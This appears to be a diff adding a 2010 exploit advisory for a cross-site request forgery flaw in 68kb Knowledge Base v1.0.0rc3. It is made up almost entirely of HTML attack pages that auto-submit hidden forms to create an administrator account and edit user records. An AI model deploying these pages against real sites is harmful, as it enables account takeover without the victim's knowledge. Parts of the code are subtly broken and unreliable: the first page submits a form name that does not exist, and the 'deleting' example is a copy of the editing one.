@@ -1,0 +1,47 @@
+Exploit Title: 68kb Knowledge Base v1.0.0rc3 create administrator account CSRF
+Date: 2010-04-02
+Author: Jelmer de Hen
+Software Link: http://68kb.googlecode.com/files/68kb-v1.0.0rc3.zip
+Version: v1.0.0rc3
+
+<html>
+<body onload="document.forms["edit"].submit()">
+<form name="create" method="post" action="http://<server>/index.php/admin/users/add">
+<input type=hidden name="username" value="JohnDoe">
+<input type=hidden name="email" value="email">
+<input type=hidden name="level" value="1">
+<input type=hidden name="password" value="password">
+<input type=hidden name="passconf" value="password">
+</form>
+</body>
+</html>
+
+Example of deleting an account:
+
+<html>
+<body onload="document.forms["edit"].submit()">
+<form name="edit" method="post" action="http://<server>/index.php/admin/users/edit/1">
+<input type=hidden name="username" value="JohnDoe">
+<input type=hidden name="email" value="email">
+<input type=hidden name="level" value="1">
+<input type=hidden name="password" value="password">
+<input type=hidden name="passconf" value="password">
+<input type=hidden name="id" value="1">
+</form>
+</body>
+</html>
+
+Example of editing:
+
+<html>
+<body onload="document.forms["edit"].submit()">
+<form name="edit" method="post" action="http://<server>/index.php/admin/users/edit/1">
+<input type=hidden name="username" value="JohnDoe">
+<input type=hidden name="email" value="email">
+<input type=hidden name="level" value="1">
+<input type=hidden name="password" value="password">
+<input type=hidden name="passconf" value="password">
+<input type=hidden name="id" value="1">
+</form>
+</body>
+</html>
